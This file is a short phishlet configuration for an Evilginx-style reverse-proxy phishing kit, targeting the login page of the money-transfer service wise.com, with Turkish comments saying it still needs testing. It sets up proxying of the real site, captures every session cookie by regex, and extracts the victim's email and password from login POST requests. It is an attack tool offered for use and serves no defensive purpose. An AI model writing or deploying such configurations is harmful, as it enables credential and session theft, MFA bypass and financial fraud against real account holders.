# Test edilmesi gerekiyor, hazır halde değil!
author: '@buffer'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'wise.com', session: true, is_landing: true}

sub_filters: []

# Eğer verilen key çalışmazsa oauthToken ve userToken verileri çekilecek
auth_tokens:
  - domain: 'wise.com'
    keys: ['.*,regexp']

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'wise.com'
  path: '/login'
